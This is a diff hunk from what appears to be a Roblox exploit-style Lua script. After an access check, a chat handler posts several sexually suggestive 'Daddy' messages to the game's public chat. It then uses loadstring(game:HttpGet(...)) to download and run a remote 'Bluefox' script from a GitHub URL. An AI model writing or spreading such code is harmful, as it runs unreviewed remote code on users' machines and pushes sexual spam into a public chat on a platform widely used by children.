@@ -23,7 +23,7 @@ local function onChatted(player, message)
                 game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Oh God Daddy UwU", "All")
  game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Oh Yes Daddy Harder OwO", "All")
  game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Ah Thats The Spot Daddy", "All")
- game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("deeper Please Daddy", "All")
+ game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("deeper Please Daddy Ohh UwU", "All")
                 loadstring(game:HttpGet("https://raw.githubusercontent.com/eeeeeeeesw/Bluefox/main/bluefox%20script.lua"))()
             else
                 print("Access denied.")
